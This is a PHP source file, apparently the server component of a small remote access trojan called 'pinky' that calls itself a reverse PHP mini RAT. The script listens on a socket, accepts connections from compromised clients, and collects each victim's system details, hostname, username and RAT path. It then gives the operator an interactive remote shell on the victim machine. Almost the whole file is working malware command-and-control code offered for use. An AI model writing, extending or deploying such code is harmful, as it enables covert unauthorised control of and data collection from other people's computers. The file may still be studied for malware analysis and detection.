<?php
set_time_limit ( 0 );

$version = "0.1";
$author = "David Tavarez (davidtavarez)";
$url = "https://github.com/davidtavarez/pinky";

echo chr ( 27 ) . chr ( 91 ) . 'H' . chr ( 27 ) . chr ( 91 ) . 'J';
echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
echo "(server)";
echo $author . "\n";
echo $url . "\n";

$params = "a:";
$params .= "p:";
$params .= "t:";

$options = getopt ( $params );

$address = isset ( $options ['a'] ) ? $options ['a'] : '0.0.0.0';
$port = isset ( $options ['p'] ) ? ( int ) $options ['p'] : 3391;
$type = isset ( $options ['t'] ) ? $options ['t'] : 'tcp';

echo "\nCreating server... ";
$socket = stream_socket_server ( $type . '://' . $address . ':' . $port, $error_number, $error_message );
if ($socket === false) {
	exit ( "Could not bind to socket: " . $error_message );
} else {
	echo "OK.\n";
}
echo "\e[1m" . strtoupper ( $type ) . "\e[0m server \e[1mrunning\e[0m at \e[1m" . $address . "\e[0m port \e[1m" . $port . "\e[0m\n\n";
echo "Waiting for connection...\n\n";

$stop_server = false;

while ( $stop_server == false ) {
	$session = stream_socket_accept ( $socket );
	
	echo "[!] Connetion accepted from: \e[1m" . stream_socket_get_name ( $session, false ) . "\e[0m \n";
	// Getting basic information.
	// System information
	$system = stream_socket_recvfrom ( $session, 1024 );
	echo "System: \e[1m" . $system . "\e[0m\n";
	stream_socket_sendto ( $session, "System information received." );
	// Machine type
	$machine = stream_socket_recvfrom ( $session, 1024 );
	echo "Machine: \e[1m" . $machine . "\e[0m\n";
	stream_socket_sendto ( $session, "Machine type received." );
	// Hostname
	$hostname = stream_socket_recvfrom ( $session, 1024 );
	echo "Hostname: \e[1m" . $hostname . "\e[0m\n";
	stream_socket_sendto ( $session, "Hostname received." );
	// User who's running the RAT
	$user = stream_socket_recvfrom ( $session, 1024 );
	echo "User: \e[1m" . $user . "\e[0m\n";
	stream_socket_sendto ( $session, "Username received." );
	// The bin path
	$bin_path = stream_socket_recvfrom ( $session, 1024 );
	echo "Bin Path: \e[1m" . $bin_path . "\e[0m\n";
	stream_socket_sendto ( $session, "Bin path received." );
	// The RAT path
	$rat_path = stream_socket_recvfrom ( $session, 1024 );
	echo "RAT Path: \e[1m" . $rat_path . "\e[0m\n";
	stream_socket_sendto ( $session, "Client path received." );
	
	echo "Starting shell...\n\n";
	echo stream_socket_recvfrom ( $session, 1024 );
	
	stream_set_blocking ( $session, 0 );
	stream_set_blocking ( STDIN, 0 );
	
	while ( is_resource ( $session ) ) {
		$input = fgets ( STDIN );
		stream_socket_sendto ( $session, $input );
		$response = stream_socket_recvfrom ( $session, 1024 );
		if (strlen ( $response ) > 0) {
			echo $response;
		}
	}
}

echo "\nStoping server... ";
fclose ( $socket );
echo "OK.\n\n";